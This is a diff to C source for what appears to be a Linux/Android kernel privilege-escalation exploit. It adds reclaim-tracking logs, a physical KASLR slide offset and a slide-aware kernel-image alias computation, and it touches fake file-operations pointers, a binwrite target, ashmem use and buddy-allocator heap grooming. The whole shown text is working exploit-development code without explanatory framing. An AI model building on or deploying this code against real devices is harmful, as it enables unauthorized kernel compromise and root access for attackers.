@@ -87,6 +87,38 @@ static int reclaim_sv_inited;
 static int reclaim_batch_cnt;
 static int rb_cur;
 
+void rmg_log_reclaim_lifetime(const char *stage) {
+  int active_batches = 0;
+  int open_all = 0;
+  int current_open = 0;
+  if (!reclaim_sv_inited) {
+    pr_info("[reclaim-life] stage=%s pid=%d inited=0 batch_cnt=%d rb_cur=%d "
+            "active_batches=0 open_endpoints=0 current_open=0 ring=%d\n",
+            stage ? stage : "?", getpid(), reclaim_batch_cnt, rb_cur,
+            SKB_RECLAIM_BATCHES);
+    return;
+  }
+  for (int b = 0; b < SKB_RECLAIM_BATCHES; b++) {
+    int batch_open = 0;
+    for (int p = 0; p < SKB_RECLAIM_PAIRS; p++) {
+      for (int i = 0; i < 2; i++) {
+        if (reclaim_sv[b][p][i] >= 0) {
+          batch_open++;
+          open_all++;
+        }
+      }
+    }
+    if (batch_open > 0)
+      active_batches++;
+    if (b == rb_cur)
+      current_open = batch_open;
+  }
+  pr_info("[reclaim-life] stage=%s pid=%d inited=%d batch_cnt=%d rb_cur=%d "
+          "active_batches=%d open_endpoints=%d current_open=%d ring=%d\n",
+          stage ? stage : "?", getpid(), reclaim_sv_inited, reclaim_batch_cnt,
+          rb_cur, active_batches, open_all, current_open, SKB_RECLAIM_BATCHES);
+}
+
 static void reclaim_batch_close(int b) {
   for (int p = 0; p < SKB_RECLAIM_PAIRS; p++) {
     for (int i = 0; i < 2; i++) {
@@ -150,6 +182,10 @@ uintptr_t fake_left;
 uintptr_t fake_fops;
 uintptr_t binwrite_target;
 uintptr_t slide_p0_offset;
+/* TRACE6: physical KASLR is a separate domain from kaslr_slide. */
+uintptr_t p0_phys_slide_offset;
+int p0_phys_slide_known;
+int p0_phys_slot = -1;
 char ashmem_path[256] = "/dev/ashmem";
 
 void setup_kernelsnitch(void) {
@@ -244,6 +280,10 @@ void log_startup_context(void) {
              (unsigned long long)SLIDE_INIT_TASK,
              (unsigned long long)SLIDE_ROOT_TASK_GROUP,
              (unsigned long long)SLIDE_SYSCTL_BOOTID);
+  pr_info("[cfi-trace6-physbase] live_memstart=0000000080000000 "
+          "pre_slide_load=0000000080000000 image_text_offset=0000000000000000 "
+          "phys_granule=0000000000008000 phys_slots=64 "
+          "virtual_slide_separate=1 policy=scan-and-continue\n");
 }
 
 void disable_rseq_for_thread(void) {
@@ -332,10 +372,14 @@ int open_ashmem_device(void) {
   return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
 }
 
-uintptr_t p0_data_alias(uintptr_t image_addr) {
+uintptr_t p0_data_alias_with_slide(uintptr_t image_addr, uintptr_t phys_slide) {
   uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
-  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
+  uintptr_t phys = P0_KERNEL_PHYS_LOAD + phys_slide + off;
   return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
+}
+
+uintptr_t p0_data_alias(uintptr_t image_addr) {
+  return p0_data_alias_with_slide(image_addr, p0_phys_slide_offset);
 }
 
 uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
@@ -822,9 +866,16 @@ static int order3_hold_inited;
 /* /proc/buddyinfo has no per-migrate-type split; order-3 totals are good
  * enough (the absorb also steals the other types via rmqueue fallback). */
 static long buddyinfo_order3_free(void) {
+  static int rmg_buddy_open_warned;
+  errno = 0;
   FILE *fp = fopen("/proc/buddyinfo", "r");
-  if (!fp)
+  if (!fp) {
+    if (!rmg_buddy_open_warned) {
+      rmg_buddy_open_warned = 1;
+      pr_warning("[cfi-trace4] buddyinfo open failed errno=%d\n", errno);
+    }
     return -1;
+  }
   char line[512];
   long fallback = -1, normal = -1;
   while (fgets(line, sizeof(line), fp)) {
@@ -841,7 +892,15 @@ static long buddyinfo_order3_free(void) {
       normal = (long)c3;
   }
   fclose(fp);
-  return normal >= 0 ? normal : fallback;
+  long result = normal >= 0 ? normal : fallback;
+  if (result < 0) {
+    static int rmg_buddy_parse_warned;
+    if (!rmg_buddy_parse_warned) {
+      rmg_buddy_parse_warned = 1;
+      pr_warning("[cfi-trace4] buddyinfo parsed but no usable order3 value\n");
+    }
+  }
+  return result;
 }
 
 static void order3_hold_begin(const struct msghdr *msg) {
@@ -1526,6 +1585,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
           skb_sent, reclaim_want,
           oppo_teardown ? 1 : SKB_RECLAIM_PAIRS,
           oppo_teardown ? " oppo" : (drain_sends ? " drain" : " hold"));
+  rmg_log_reclaim_lifetime("post-reclaim");
 
   if (!oppo_teardown && payload_mode == PAGE_PAYLOAD_FOPS &&
       !verify_fops_on_page(base)) {
